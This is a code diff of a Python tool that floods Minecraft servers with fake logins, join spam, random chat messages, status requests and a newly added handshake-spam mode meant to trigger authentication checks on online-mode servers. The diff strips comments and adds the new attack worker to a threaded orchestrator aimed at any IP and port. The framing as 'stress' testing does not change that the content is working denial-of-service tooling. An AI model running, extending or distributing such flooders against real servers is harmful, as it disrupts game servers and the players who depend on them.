@@ -60,23 +60,20 @@ def send_fake_join(ip, port, username, mod_data=None):
         sock.connect((ip, port))
 
         # Handshake Packet
-        # If mod_data is present, we send it. Otherwise, vanilla handshake.
-        # This is a simplified Forge handshake. A more accurate one is much more complex.
         if mod_data and 'FML' in mod_data.get('type', ''):
-            # Append FML marker to host string
             ip_fml = f"{ip}\0FML\0"
             handshake_data = (
-                pack_varint(-1) + # Protocol version for FML
+                pack_varint(-1) +
                 pack_string(ip_fml) +
                 struct.pack(">H", port) +
-                pack_varint(2)  # State 2: Login
+                pack_varint(2)
             )
         else:
             handshake_data = (
-                pack_varint(758) +  # Protocol version (1.18.2)
+                pack_varint(758) +
                 pack_string(ip) +
                 struct.pack(">H", port) +
-                pack_varint(2)  # State 2: Login
+                pack_varint(2)
             )
         sock.sendall(pack_packet(0x00, handshake_data))
 
@@ -84,15 +81,31 @@ def send_fake_join(ip, port, username, mod_data=None):
         login_data = pack_string(username)
         sock.sendall(pack_packet(0x00, login_data))
 
-        # Keep connection alive briefly to ensure login is processed
         sock.settimeout(0.5)
-        sock.recv(1024) # Wait for server response
+        sock.recv(1024)
         return sock
-    except Exception as e:
-        # print(f"[STRESS-ERROR] Actor failed to connect/send to {ip}:{port} - {e}")
+    except Exception:
         if 'sock' in locals():
             sock.close()
         return None
+
+def send_login_attempt(ip, port, username):
+    """Sends a handshake and login start packet without waiting for a response."""
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.settimeout(2)
+            sock.connect((ip, port))
+            handshake_data = (
+                pack_varint(758) +
+                pack_string(ip) +
+                struct.pack(">H", port) +
+                pack_varint(2)
+            )
+            sock.sendall(pack_packet(0x00, handshake_data))
+            login_data = pack_string(username)
+            sock.sendall(pack_packet(0x00, login_data))
+    except Exception:
+        pass # Errors are expected as the server will disconnect us
 
 def send_chat_message(sock, message):
     """Sends a chat message on an established socket."""
@@ -109,14 +122,12 @@ def send_motd_request(ip, port):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             sock.settimeout(2)
             sock.connect((ip, port))
-            
             handshake_data = pack_varint(758) + pack_string(ip) + struct.pack(">H", port) + pack_varint(1)
             sock.sendall(pack_packet(0x00, handshake_data))
-            
             sock.sendall(pack_packet(0x00, b''))
             sock.recv(4096)
     except Exception:
-        pass # Suppress errors for this flood
+        pass
 
 # --- Attack Mode Workers ---
 
@@ -126,7 +137,7 @@ def worker_login_flood(stop_time, ip, port, mod_data):
         username = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
         sock = send_fake_join(ip, port, username, mod_data)
         if sock:
-            time.sleep(0.5) 
+            time.sleep(0.5)
             sock.close()
 
 def worker_join_spam(stop_time, ip, port):
@@ -145,7 +156,6 @@ def worker_chat_flood(stop_time, ip, port):
     sock = send_fake_join(ip, port, username)
     if not sock:
         return
-
     while time.time() < stop_time:
         message = ''.join(random.choices(string.ascii_letters + string.digits + ' ', k=random.randint(10, 50)))
         if not send_chat_message(sock, message):
@@ -159,6 +169,13 @@ def worker_motd_spam(stop_time, ip, port):
         send_motd_request(ip, port)
         time.sleep(random.uniform(0.05, 0.2))
 
+def worker_handshake_spam(stop_time, ip, port):
+    """Worker for spamming login attempts to trigger auth checks on online-mode servers."""
+    while time.time() < stop_time:
+        username = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+        send_login_attempt(ip, port, username)
+        time.sleep(0.02) # Small delay to prevent overwhelming the actor's network stack
+
 # --- Main Orchestrator ---
 
 def run_stress(ip, port, threads=100, duration=30, mode="login_flood", mod_data=None):
@@ -170,6 +187,7 @@ def run_stress(ip, port, threads=100, duration=30, mode="login_flood", mod_data=
         "join_spam": (worker_join_spam, (stop_time, ip, port)),
         "chat_flood": (worker_chat_flood, (stop_time, ip, port)),
         "motd_spam": (worker_motd_spam, (stop_time, ip, port)),
+        "handshake_spam": (worker_handshake_spam, (stop_time, ip, port)),
     }
 
     target_worker, args = worker_map.get(mode, (worker_login_flood, (stop_time, ip, port, None)))
@@ -191,25 +209,15 @@ def probe_server_for_mods(ip, port, timeout=5):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         sock.settimeout(timeout)
         sock.connect((ip, port))
-
-        # Handshake for Status
         handshake_data = pack_varint(758) + pack_string(ip) + struct.pack(">H", port) + pack_varint(1)
         sock.sendall(pack_packet(0x00, handshake_data))
-        
-        # Status Request
         sock.sendall(pack_packet(0x00, b''))
-        
-        # Read response
         packet_len = read_varint(sock)
         packet_id = read_varint(sock)
-        
         if packet_id != 0x00:
             raise ConnectionError("Invalid status response packet ID.")
-            
         json_response = read_string(sock)
         data = json.loads(json_response)
-
-        # Check for Forge/FML mod info
         if 'modinfo' in data and data['modinfo'].get('type') == 'FML':
             return data['modinfo']
         else:
